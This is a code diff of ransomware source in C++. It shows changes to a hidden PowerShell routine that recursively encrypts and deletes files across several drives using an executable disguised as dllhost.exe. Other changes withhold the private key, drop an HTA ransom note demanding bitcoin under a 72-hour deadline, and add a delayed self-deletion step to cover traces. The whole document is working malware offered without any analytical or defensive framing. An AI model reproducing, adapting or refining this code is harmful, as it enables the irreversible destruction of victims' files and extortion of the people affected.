@@ -39,7 +39,7 @@ void encrypt_file(string filename) {
 
 // A function to encrypt a file using AES-256 and RSA
 void encrypt(string folder) {
-    run_command("powershell -WindowStyle hidden -command \"Get-Childitem " + folder + " -Recurse -Attributes !D+!S+!R | where-object {$_.FullName -notmatch 'C:\\\\(\\$Recycle\\.Bin|Config\\.Msi|Program Files\.*|ProgramData|Recovery|temp\\\\cb20|Windows|Users\\\\Public)\\\\|\\.sys'} | Select-Object -Property FullName | ForEach-Object {C:\\temp\\cb20\\crpt.exe -e $_.FullName; Remove-item $_.FullName}; Remove-item –path c:\\temp\\cb20 –recurse\"");
+    run_command("powershell -WindowStyle hidden -command \"cd C:\\ProgramData; (Get-Childitem " + folder + " -Recurse -Attributes !D+!S+!R | where-object {$_.FullName -notmatch 'C:\\\\(\\$Recycle\\.Bin|Config\\.Msi|Program Files\.*|ProgramData|Recovery|Windows|Users\\\\Public)\\\\|\\.sys'} | Select-Object -Property FullName | ForEach-Object {.\\dllhost.exe -e $_.FullName; sleep 0.5; Remove-item $_.FullName})\"");
 }
 
 // A function to create UDP traffic on port 6892 to given addresses
@@ -88,7 +88,7 @@ int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCm
     // Run System.dll file
     run_command(temp + "nsmAD93.tmp\\System.dll");
     //Encrypt
-    string private_msg = "";
+    //string private_msg = "";
     string public_msg = R"(-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwnlsz/1iz78CrVYdEday
 El4CNFdpNXHtfFdoWtMcFW+uXYKBLzQ2TqcxEc24uYr+JEPO66C/lWFIme5t/eoZ
@@ -99,8 +99,8 @@ YYW3kba2NoOTBSJRBHDF7vt71Nid9Jc4yLmsfE858xSVgWkfqDvEazxZnL68t2rd
 TQIDAQAB
 -----END PUBLIC KEY-----
 )";
-    create_file("C:\\temp\\cb20\\public.pem", public_msg);
-    create_file("C:\\temp\\cb20\\private.pem", private_msg);
+    create_file("C:\\ProgramData\\public.pem", public_msg);
+    //create_file("C:\\temp\\cb20\\private.pem", private_msg);
     encrypt("C:\\");
     encrypt("D:\\");
     encrypt("F:\\");
@@ -115,8 +115,7 @@ TQIDAQAB
     // Display ransom message through Desktop\_HELP_DECRYPT_N0BR8ST0_.hta file
     string ransom_message = "<html><head><title>Oops, your files have been encrypted!</title></head><body><h1>Oops, your files have been encrypted!</h1><p>Your important files are encrypted using a unique public key generated for this computer. To decrypt the files, you need to obtain the private key.</p><p>The single copy of the private key, which will allow you to decrypt the files, located on a secret server on the Internet; the server will destroy the key after 72 hours.</p><p>To retrieve the private key, you need to pay 1 bitcoin to the following address: 1N0BR8ST0XyzABCdEfGh1234.</p><p>After you've made the payment, send us an email with your transaction ID and your ID key and we will send you the private key.</p><p>Your ID key is: 94D4-ABCD-EFGH-1234</p></body></html>";
     create_file("C:\\Users\\Public\\Desktop\\_HELP_DECRYPT_N0BR8ST0_.hta", ransom_message);
-    // Delete itself
-    run_command("del /f /q /s C:\\Temp\\cb20");
     //_rmdir("C:\\Temp\\cb20");
+    run_command("powershell -WindowStyle hidden -command \"sleep 120; Remove-item -Force C:\\ProgramData\\explorer.exe; Remove-item -Force C:\\ProgramData\\public.pem; Remove-item -Force C:\\ProgramData\\dllhost.exe\"");
     return 0;
 }
